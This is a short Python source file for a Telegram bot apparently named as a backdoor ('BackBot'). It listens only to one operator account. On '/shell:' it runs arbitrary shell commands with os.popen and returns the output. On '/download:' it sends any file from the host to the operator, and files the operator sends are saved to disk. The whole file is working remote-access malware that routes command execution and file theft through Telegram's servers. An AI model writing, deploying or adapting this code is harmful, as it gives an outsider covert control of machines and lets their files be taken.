import telepot
import time
import os

# telegram api token
API_TOKEN = "YOUR_API_TOKEN_HERE"

# telegram account id list
# your bot will only listen to commands from this account
MASTER_ID = [999999999]


class BackBot(telepot.Bot):
    def handle(self, msg):
        content_type, chat_type, user_id = telepot.glance2(msg)

        if user_id in MASTER_ID:
            if content_type == "text":
                text = msg["text"]
                if '/shell:' in text:
                    cmd = text[7:]
                    proc = os.popen(cmd)
                    self.sendMessage(user_id, proc.read())
                elif '/download:' in text:
                    path = text[10:]
                    doc = open(path, 'rb')
                    self.sendDocument(user_id, doc)
            elif content_type == "document":
                file_id = msg["document"]["file_id"]
                file_name = msg["document"]["file_name"]
                self.downloadFile(file_id, file_name)


def main():
    bot = BackBot(API_TOKEN)
    bot.notifyOnMessage()

    while True:
        time.sleep(10)


if __name__ == '__main__':
    main()
